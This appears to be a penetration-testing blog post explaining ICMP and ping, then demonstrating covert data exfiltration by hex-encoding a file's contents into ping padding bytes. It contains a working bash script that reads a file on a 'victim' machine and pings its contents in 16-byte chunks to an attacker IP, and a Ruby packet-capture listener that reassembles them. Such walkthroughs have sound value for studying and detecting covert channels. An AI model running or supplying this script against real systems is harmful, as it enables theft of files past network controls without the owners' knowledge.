---
layout: post
title: "DATA EXFILTRATION with PING"
date: 2021-06-01T20:10:00+05:30
categories: ["Pentest Engagement"]
description: "In this post we dive deep into the ICMP protocol and utilise the same for exfiltration of data without any external tool. Before we get into technical stuff let us quickly brush up"
original_url: "https://blog.alphathreat.in/index.php?post/2021/06/01/DATA-EXFILTRATION%3A-The-malicious-PING-packets"
---

In this post we dive deep into the ICMP protocol and utilise the same for exfiltration of data without any external tool. Before we get into technical stuff let us quickly brush up on our theory.

### ICMP

The ICMP stands for Internet Control Message Protocol. It is a network layer protocol used by network devices to diagnose network communication issues.

Unlike the Internet Protocol (IP), ICMP is not associated with a transport layer protocol such as TCP or UDP. This makes ICMP a connectionless protocol: one device does not need to open a connection with another device before sending an ICMP message.

### ![icmp_packet.png, Jun 2021]({{ site.baseurl }}/assets/blog/Ping/icmp_packet.png)

In a linux box the default packetsize is 56 bytes, which  translates into 64 ICMP data bytes when combined with the 8 bytes of ICMP header data.

### PING

Ping abbreviates for '**Packet Internet Groper**'. Ping is a computer network administration software utility used to test the reachability of a host on an Internet Protocol (IP) network. It is available for virtually all operating systems that have networking capability, including most embedded network administration software. Ping operates by sending Internet Control Message Protocol (ICMP) echo request packets to the target host and waiting for an ICMP echo reply. Ping is part of the iputils (or iputils-ping) package, which is pre-installed on nearly all Linux distributions.

![300px-Cmd-ping.png, Jun 2021]({{ site.baseurl }}/assets/blog/Ping/300px-Cmd-ping.png)

### HEXADECIMAL SYSTEM

The hexadecimal numeral system, often shortened to "hex", is a numeral system made up of 16 symbols (base 16). There are 16 Hexadecimal digits. They are the same as the decimal digits up to 9, but then there are the letters A, B, C, D, E and F in place of the decimal numbers 10 to 15:

Hexadecimal:     0     1     2     3     4     5     6     7     8     9     A     B     C     D     E     F
Decimal:             0     1     2     3     4     5     6     7     8     9     10   11   12   13    14  15

So a single Hexadecimal digit can show 16 different values instead of the normal 10.

### DATA EXFILTRATION WITH PING COMMAND

If we notice closely the '**man ping**' states a very useful option for our task of exfiltration.

**-p pattern**
              You  may specify up to 16 "pad" bytes to fill out the packet you
              send.  This is useful for diagnosing data-dependent problems in  a
              network.   For  example,  -p  ff  will cause the sent packet to be
              filled with all ones.

This means the native version of ping which ships with the linux box, has the capability to send **16 bytes** of data per packet. This is not a very big size, but it simply satisfies our requirement of using native tool and transferring some data in text form. And since ping can be used by any user, the attacker do not need root access to perform this action. Also, the data needs to be in the hexadecimal format.

Now in order to send a string that says 'Hello World' , we need to convert it to Hex. We can do that using some online website like [rapidtables](https://www.rapidtables.com/convert/number/hex-to-ascii.html "Rapidtables") or using linux **xxd utility** by command:

```
$ echo Hello World | xxd
00000000: 4865 6c6c 6f20 576f 726c 640a            Hello World.
```

In order to use it with ping we need to combine the output to remove spaces, this can be done by using **-ps** switch of xxd

```
$ echo Hello World | xxd -ps
48656c6c6f20576f726c640a
```

Now one thing to note here is if the length of our payload is not 16 bytes as expected by the ping command, it automatically repeats the pattern thus giving you  duplicate text.

![Hex-ASCII_table.png, Jun 2021]({{ site.baseurl }}/assets/blog/Ping/Hex-ASCII_table.png)

Consider the table above.

'A' in hex is 41

'B' in hex is 42

we can check the same on our terminal by typing:

```
$ echo -n AB | xxd -ps
4142
```

here 41 and 42 each represents 1 byte size, therefore 4142 are two bytes,

Similarly if we do,

```
$ echo Hello World | xxd -ps
```

the output received **48 65 6c 6c 6f 20 57 6f 72 6c 64 0a** is equal to 12 bytes, half of its length size

Now we are good with the theory we need. Let us now craft a ping packet to send the text '**Hello World how are you**' and view the response in wireshark

```
$ echo hello world how are you | xxd -ps
68656c6c6f20776f726c6420686f772061726520796f750a

$ ping -p 68656c6c6f20776f726c6420686f772061726520796f750a 192.168.0.13 -c 1
```

![ping_test.png, Jun 2021]({{ site.baseurl }}/assets/blog/Ping/ping_test.png)

In wireshark we can see that the data repeats exactly after 16 bytes i.e. **68 65 6c 6c 6f 20 77 6f 72 6c 64 20 68 6f 77 2**0 , the later part 61726520796f750a  got eliminated.

![packetsize.png, Jun 2021]({{ site.baseurl }}/assets/blog/Ping/packetsize.png)

We can remove the duplicate by limiting packet size, this can be achieved by **-s** switch of ping. Checking the manpage for ping again

**-s packetsize**
              Specifies the number of data bytes to be sent.  The default is
              56, which translates into 64 ICMP  data  bytes  when  combined
              with the 8 bytes of ICMP header data.

So let us now limit the packet size to 32 bits, this will remove the extra 24 bytes where data gets repeated.

```
$ ping -p 68656c6c6f20776f726c6420686f772061726520796f750a 192.168.0.13 -c 1 -s 32
```

![ping_data_no_repeat.png, Jun 2021]({{ site.baseurl }}/assets/blog/Ping/ping_data_no_repeat.png)

Now the data looks good in wireshark after limiting packet size

### SCRIPTING

Let us now achieve the above steps with the help of a script. Please note that this script is designed  for transferring simple data like text.This script do not need any root permission to run. Due to the limiting capability of native ping, it can't be used to transfer other files. We will cover advanced file transers in another post.

```
#!/bin/bash
domain="192.168.1.9"
input="sample"

for a in $(cat $input | xxd -ps -c 16)
do
dsize=$(echo -n $a | wc -c)

if [[ $dsize -lt "32" ]]
then
padding=$((32 - $dsize))'s'
padding=$(printf %$padding | tr " " "0")
a=$a$padding
fi
ping -c 1 -p $a $domain -s 32
done
```

**Breakdown**

- **domain="192.168.1.9"** // Set the Attackers IP, where he listens for incoming data
- **input="sample"** // Text file to read on victim machine
- **for a in $(cat $input | xxd -ps -c 16)**    // Read the text file, change to Hex and set the data payload to 16 byte each line
- **if [[ $dsize -lt "32" ]]** // check if the data size is less than 32 bytes
- **padding=$(printf %$padding | tr " " "0")**  //append null character if datasize is less than 16, to avoid bad characters
- **ping -c 1 -p $a $domain -s 32** //send ping packet

### ATTACKER SIDE

On other side the attacker start listening for incoming data. Attacker has created another script to filter out the ICMP packets received and extract the plaintext data. Since our attacker is a keen Rubyist, he developed his script in pure Ruby language.

```
require 'packetfu'
require 'pp'

capture = PacketFu::Capture.new :iface => 'wlp6s0b1', :promisc => true, :start => true, :filter => 'icmp'
capture.stream.each do |p|
pkt = PacketFu::Packet.parse p
  if pkt.icmp_type == 8
  pkt1=pkt.payload
  puts pkt1[17..-1]
  end
end
```

Let us now try to fetch contents of a file titled secret from victim machine, with below contents

![file contents.png, Jun 2021]({{ site.baseurl }}/assets/blog/Ping/file_contents.png)

Attacker now runs the bash script on victim machine and ruby script on his machine

Below image shows output of scripts upon execution

- Left side terminal is victim shell where the bash script is executed.
- Right side terminal is attacker where he is colleting data from ping packets
- Below is the wireshark instance to show the ICMP activity

![data_exfiltrate.gif, Jun 2021]({{ site.baseurl }}/assets/blog/Ping/data_exfiltrate.gif)

![data exfiltration.png, Jun 2021]({{ site.baseurl }}/assets/blog/Ping/data_exfiltration.png)
